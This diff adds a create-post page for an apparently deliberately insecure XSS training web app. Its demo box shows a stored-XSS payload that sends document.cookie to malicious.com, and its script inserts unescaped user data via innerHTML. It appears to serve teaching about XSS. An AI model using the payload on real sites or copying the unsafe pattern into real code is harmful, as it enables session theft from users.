@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Post - Insecure Version</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 Create New Post</h1>
+            <p>Insecure Version - XSS Storage Vulnerability</p>
+        </div>
+        
+        <div class="nav">
+            <a href="/">Home</a>
+            <a href="/login.html">Login</a>
+            <a href="/register.html">Register</a>
+            <a href="/posts.html">All Posts</a>
+            <a href="/create-post.html">Create Post</a>
+            <a href="/search.html">Search</a>
+            <a href="/users.html">Users</a>
+            <a href="/reflect-xss.html">Reflected XSS</a>
+            <a href="/dom-xss.html">DOM XSS</a>
+        </div>
+        
+        <div class="content">
+            <div id="userInfo" class="user-corner" style="display: none;">
+            </div>
+            
+            <div class="card">
+                <div id="message"></div>
+                
+                <div id="authRequired" class="message warning" style="display: none;">
+                    Please <a href="/login.html">login</a> to create posts.
+                </div>
+                
+                <form id="createPostForm" style="display: none;">
+                    <div class="form-group">
+                        <label for="title">Post Title:</label>
+                        <input type="text" id="title" name="title" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="content">Post Content:</label>
+                        <textarea id="content" name="content" required></textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn">Create Post</button>
+                </form>
+                
+                <div class="security-demo">
+                    <h3>💡 XSS Demo:</h3>
+                    <p>Try creating a post with this content:</p>
+                    <code>&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</code>
+                    <p>Or try a more dangerous example:</p>
+                    <code>&lt;script&gt;window.location="http://malicious.com/steal?cookie="+document.cookie&lt;/script&gt;</code>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentUser = null;
+        let sessionId = localStorage.getItem('sessionId');
+        
+        async function getUserInfo() {
+            if (!sessionId) return false;
+            
+            try {
+                const response = await fetch('/api/user', {
+                    headers: {
+                        'Authorization': sessionId
+                    }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    currentUser = data.user;
+                    checkAuthentication();
+                    return true;
+                }
+            } catch (error) {
+                localStorage.removeItem('sessionId');
+                sessionId = null;
+            }
+            return false;
+        }
+        
+        function displayUserInfo() {
+            if (currentUser) {
+                const userInfoDiv = document.getElementById('userInfo');
+                userInfoDiv.style.display = 'block';
+                userInfoDiv.innerHTML = `
+                    <div class="user-info">
+                        <strong>Welcome, ${currentUser.username}</strong>
+                        <span class="security-badge">${currentUser.role}</span>
+                        <button id="logoutButton" class="btn btn-danger">Logout</button>
+                    </div>
+                `;
+                
+                document.getElementById('logoutButton').addEventListener('click', logout);
+            }
+        }
+        
+        async function logout() {
+            try {
+                const response = await fetch('/api/logout', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': sessionId
+                    }
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    localStorage.removeItem('sessionId');
+                    sessionId = null;
+                    currentUser = null;
+                    window.location.href = '/';
+                } else {
+                    showMessage('error', 'Logout failed');
+                }
+            } catch (error) {
+                showMessage('error', 'Logout failed');
+            }
+        }
+        
+        // check certification status
+        function checkAuthentication() {
+            const authRequired = document.getElementById('authRequired');
+            const createPostForm = document.getElementById('createPostForm');
+            
+            if (currentUser) {
+                authRequired.style.display = 'none';
+                createPostForm.style.display = 'block';
+                displayUserInfo();
+            } else {
+                authRequired.style.display = 'block';
+                createPostForm.style.display = 'none';
+            }
+        }
+        
+        document.getElementById('createPostForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const title = document.getElementById('title').value;
+            const content = document.getElementById('content').value;
+            
+            try {
+                const response = await fetch('/api/posts', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': sessionId
+                    },
+                    body: JSON.stringify({
+                        title: title,
+                        content: content
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showMessage('success', 'Post created successfully! Redirecting...');
+                    setTimeout(() => {
+                        window.location.href = '/posts.html';
+                    }, 1500);
+                } else {
+                    showMessage('error', `Failed to create post: ${result.error}`);
+                }
+            } catch (error) {
+                showMessage('error', `Error: ${error.message}`);
+            }
+        });
+        
+        function showMessage(type, text) {
+            const messageDiv = document.getElementById('message');
+            messageDiv.innerHTML = `<div class="message ${type}">${text}</div>`;
+        }
+        
+        // Initialization
+        async function init() {
+            await getUserInfo();
+        }
+        
+        init();
+    </script>
+</body>
+</html>
